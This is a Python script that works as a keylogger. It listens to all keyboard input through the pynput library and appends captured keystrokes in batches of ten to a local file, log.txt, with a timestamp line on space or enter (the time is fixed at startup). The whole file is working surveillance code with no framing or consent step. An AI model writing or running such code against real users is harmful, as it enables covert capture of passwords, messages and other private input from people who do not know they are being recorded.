import pynput
from pynput.keyboard import Key, Listener
from datetime import datetime

count = 0
keys = []
now = datetime.now()

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0 or k.find("enter") > 0:
                current_time = now.strftime("%H:%M:%S")
                f.write(" - was said at " + str(current_time) + "\n")
            elif k.find("key") == -1:
                f.write(k)

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

    
with Listener(on_press=on_press) as listener:
    listener.join()